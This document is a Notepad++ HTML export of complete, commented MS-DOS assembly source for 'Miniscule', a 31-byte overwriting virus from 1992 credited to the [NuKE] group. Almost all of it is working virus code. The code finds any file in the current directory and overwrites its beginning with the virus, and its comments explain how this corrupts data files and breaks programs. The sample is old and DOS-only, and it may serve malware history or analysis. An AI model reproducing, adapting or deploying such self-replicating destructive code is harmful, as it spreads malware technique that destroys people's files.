<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; Miniscule:  the world's smallest generic virus (only 31 bytes long!)</span><span class="sc0">
</span><span class="sc1">; (C) 1992 Nowhere Man and [NuKE] WaReZ</span><span class="sc0">
</span><span class="sc1">; Written on January 22, 1991</span><span class="sc0">

</span><span class="sc5">code</span><span class="sc0">        </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc12">'CODE'</span><span class="sc0">
        </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc0">

        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">0100h</span><span class="sc0">

</span><span class="sc5">main</span><span class="sc0">        </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">


</span><span class="sc1">; Find the name of the first file and return it in the DTA.  No checking</span><span class="sc0">
</span><span class="sc1">; is done for previous infections, and ANY file (except directory "files")</span><span class="sc0">
</span><span class="sc1">; will be infected, including data, texts, etc.  So either a file is corrupted</span><span class="sc0">
</span><span class="sc1">; (in the case of data or text) or infected (.EXE and .COM files).  Files that</span><span class="sc0">
</span><span class="sc1">; have the read-only flag set are immune to Miniscule.</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">04Eh</span><span class="sc0">         </span><span class="sc1">; DOS find first file function</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc0">         </span><span class="sc1">; CX holds attribute mask</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">star_dot_com</span><span class="sc0">  </span><span class="sc1">; DX points to the file mask</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">021h</span><span class="sc0">


</span><span class="sc1">; Open the file that we've found for writing only and put the handle into</span><span class="sc0">
</span><span class="sc1">; BX (DOS stupidly returns the file handle in AX, but all other DOS functions</span><span class="sc0">
</span><span class="sc1">; require it to be in AX, so we have to move it).</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">03D01h</span><span class="sc0">       </span><span class="sc1">; DOS open file function, w/o</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">009Eh</span><span class="sc0">        </span><span class="sc1">; DX points to the found file</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">021h</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; BX holds the file handle</span><span class="sc0">


</span><span class="sc1">; Write the virus to the file.  The first 31 bytes at offset 0100h (ie: the</span><span class="sc0">
</span><span class="sc1">; virus) are written into the beginning of the victim.  No attempt is made</span><span class="sc0">
</span><span class="sc1">; to preserve the victim's executability.  This also destroys the file's date</span><span class="sc0">
</span><span class="sc1">; and time, making Miniscule's activity painfully obvious.  Also, if the</span><span class="sc0">
</span><span class="sc1">; victim is smaller than 31 bytes (rare), then it will grow to exactly 31.</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">040h</span><span class="sc0">         </span><span class="sc1">; DOS write to file function</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; CX now holds 01Fh (length)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">main</span><span class="sc0">      </span><span class="sc1">; DX points to start of code</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">021h</span><span class="sc0">


</span><span class="sc1">; Exit.  I chose to use a RET statement here to save one byte (RET is one byte</span><span class="sc0">
</span><span class="sc1">; long, INT 020h is two), so don't try to compile this as an .EXE file; it</span><span class="sc0">
</span><span class="sc1">; will crash, as only .COMs RETurn correctly (DOS again).  However INFECTED</span><span class="sc0">
</span><span class="sc1">; .EXE programs will run successfully (unless they are larger than 64k, in</span><span class="sc0">
</span><span class="sc1">; which case DOS will refuse to run it.</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; RETurn to DOS</span><span class="sc0">
</span><span class="sc5">main</span><span class="sc0">        </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc1">; The only data required in this program, and it's only four bytes long.  This</span><span class="sc0">
</span><span class="sc1">; is the file mask that the DOS find first file function will use when</span><span class="sc0">
</span><span class="sc1">; searching.  Do not change this to .EXE (or whatever) because this virus</span><span class="sc0">
</span><span class="sc1">; is size dependent (if you know what you're doing, go ahead [at you're own</span><span class="sc0">
</span><span class="sc1">; risk]).</span><span class="sc0">

</span><span class="sc5">star_dot_com</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"*.*"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; File search mask</span><span class="sc0">

</span><span class="sc5">finish</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">

</span><span class="sc5">code</span><span class="sc0">        </span><span class="sc9">ends</span><span class="sc0">
        </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">main</span><span class="sc0">

</span><span class="sc1">; There you have it:  thirty-one bytes of pure terror -- NOT!  As you can</span><span class="sc0">
</span><span class="sc1">; pretty well guess, this virus is very lame.  Due to its poor reproduction,</span><span class="sc0">
</span><span class="sc1">; it is hardly a threat (hitting one file, if you're lucky), but it works,</span><span class="sc0">
</span><span class="sc1">; and it fits the definition of a virus.  There is no way to make this code</span><span class="sc0">
</span><span class="sc1">; any smaller (at least under MS-DOS), except if you made it only infect</span><span class="sc0">
</span><span class="sc1">; one specific file (and the file would have to have a one- or two-byte name,</span><span class="sc0">
</span><span class="sc1">; too), and that would be next to useless.</span></div></body>
</html>
